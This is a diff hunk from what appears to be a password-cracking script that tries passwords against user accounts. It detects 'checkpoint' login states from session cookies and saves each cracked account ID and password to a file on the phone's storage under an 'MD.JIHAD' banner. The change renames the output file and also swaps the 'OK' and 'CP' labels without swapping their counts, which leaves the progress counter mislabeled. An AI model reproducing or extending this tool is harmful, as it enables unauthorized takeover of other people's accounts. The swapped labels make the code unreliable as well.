@@ -344,14 +344,14 @@ def rcrack(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('   \\033[1;32m(MD.JIHAD.OK 💚)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
-                open('/sdcard/M.BRAND-CP.txt', 'a').write( cid+' | '+ps+' \n')
+                print('   \033[1;32m(MD.JIHAD.OK 💚)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
+                open('/sdcard/MD.JIHAD-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r     %s[MD.JIHAD] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r     %s[MD.JIHAD] [%s/%s]  CP:- %s  OK:- %s \r'%(H,loop,tl,len(oks),len(cps))),
         sys.stdout.flush()
     except:
         pass
